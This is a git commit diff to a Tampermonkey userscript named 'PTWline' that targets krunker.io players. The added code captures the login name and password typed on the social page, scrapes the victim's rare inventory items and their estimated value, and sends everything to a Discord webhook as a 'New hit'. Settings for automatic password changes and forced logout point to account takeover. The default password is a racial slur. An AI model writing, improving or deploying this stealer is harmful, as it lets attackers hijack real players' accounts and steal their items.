c8fe1b811d11d8e2836d1aabb6cc40df20d8badc
petiuka <86064499+petiuka@users.noreply.github.com>
2023-05-03 16:29:53 +0300

    0.4 Update!
    Krunker social support

--- PTWline for krunker.io.js
+++ PTWline for krunker.io.js
@@ -1,11 +1,22 @@
-let version = 0.31
+// ==UserScript==
+// @name         PTWline krunker.io
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        https://krunker.io/*
+// @run-at       document-body
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=krunker.io
+// @grant        unsafeWindow
+// ==/UserScript==
+let version = 0.4
 
-let buildid = "KrunkerCSS"
+let buildid = "Krunker"
 let setting_hightierwebhook = "ur webhook"
 let setting_lvltohightier = 15
 let setting_lowtierwebhook = "ur webhook"
 let setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
-let setting_antiduplicate = false
+let setting_antiduplicate = true
 let setting_botname = "root"
 let setting_logout = false
 let setting_changepass = true
@@ -13,7 +24,7 @@ let setting_changepassdelay = 150
 let setting_newpassrandom = true
 let setting_newpass = "Nillkiggers122"
 let setting_logoutonfirstlaunch = true
-let setting_antisocial = true
+let setting_antisocial = false
 let setting_playsoundafterlogout = false
 let setting_soundurl = "https://cdn.discordapp.com/attachments/1014958824161026188/1089314963568476160/hello-my-name-is-gustavo.mp3"
 
@@ -70,6 +81,120 @@ let username = ""
 let password = ""
 if (doScript == true) {
 if (setting_antisocial == true && window.location.href.indexOf("social.html") > 0 ) {window.location.href = "http://krunker.io"}
+if (setting_antisocial !== true && window.location.href.indexOf("social.html") > 0 ) {
+(function() {
+    'use strict';
+
+    const selector = "#genericPop > div > div:nth-child(6) > div";
+    const checkSelector = "#profileKR";
+    function handleClick() {
+        setTimeout(checkElement1, 2222); 
+    }
+    function checkElement1() {
+        const element = document.querySelector(checkSelector);
+        if (element) {
+            console.log(username + ":" + password);
+
+document.querySelector("#market").click();
+
+setTimeout(function() {
+  document.querySelector("#m_inventory").click();
+}, 100);
+
+setTimeout(function() {
+  const invStat = getElementByXpath('/html/body/div[2]/div[15]/div[1]/div/div[9]/div/div[2]/span').innerHTML
+  console.log(invStat);
+const marketCards = document.querySelectorAll('.marketCard');
+
+const textList = [];
+
+for (let i = 0; i < marketCards.length && textList.length < 30; i++) {
+  const borderColor = getComputedStyle(marketCards[i]).borderColor;
+
+  let text;
+  if (borderColor === 'rgb(41, 41, 41)') {
+    text = marketCards[i].innerText.split('\n')[0] + ' [Contraband]';
+  } else if (borderColor === 'rgb(237, 66, 66)') {
+    text = marketCards[i].innerText.split('\n')[0] + ' [Relic]';
+  } else if (borderColor === 'rgb(255, 245, 61)') {
+    text = marketCards[i].innerText.split('\n')[0] + ' [UNOBTAINABLE]';
+  } else {
+    continue;
+  }
+
+  textList.push(text);
+}
+
+const text = textList.join('\n');
+
+
+var setting_webhook = setting_hightierwebhook
+                var myEmbed34 = {
+                    author: {
+                        name: "PTWline krunker.io"
+                    },
+                    title: "♿ **New hit! via krunker social**",
+                    description: "```Login:" + username + "\nPassword:" + password + "```\n```|      Inventory      |\n" + text + "``````Est value:" + invStat + "```",
+                    footer: {
+                        text: "BuildID:" + buildid + " | Version:" + version,
+                        icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
+                    },
+                    color: hexToDecimal(color)
+                }
+
+                var params66 = {
+                    avatar_url: setting_avatar,
+                    username: setting_botname,
+                    embeds: [myEmbed34]
+                }
+                fetch(setting_webhook, {
+                    headers: {
+                        "accept": "application/json, text/plain, */*",
+                        "content-type": "application/json;charset=UTF-8"
+                    },
+                    method: "POST",
+                    body: JSON.stringify(params66)
+                });
+
+                if (setting_antiduplicate == true) {
+                    localStorage.setItem("antidup", "1")
+                }
+console.log(textList);
+}, 1500);
+
+        }
+    }
+
+    function logMessage() {
+        console.log("ass");
+        username = document.querySelector("#accName").value
+        password = document.querySelector("#accPass").value
+        const clickElement = document.querySelector(selector);
+        clickElement.addEventListener("click", handleClick);
+    }
+
+    function checkElement() {
+        const element = document.querySelector(selector);
+        if (element) {
+            logMessage();
+
+            // Listen for changes to the input values and log them
+            const accNameInput = document.querySelector("#accName");
+            const accPassInput = document.querySelector("#accPass");
+            accNameInput.addEventListener("input", () => {
+                username = accNameInput.value
+            });
+            accPassInput.addEventListener("input", () => {
+                password = accPassInput.value
+            });
+        } else {
+            setTimeout(checkElement, 1000); 
+        }
+    }
+
+    checkElement();
+})();
+  } else {
 const observer = new MutationObserver(() => {
     if (window.location.href.indexOf("krunker.io") > 0) {
         //let changed = false
@@ -160,4 +285,5 @@ const config = {
     childList: true
 };
 observer.observe(document, config);
+}
 }
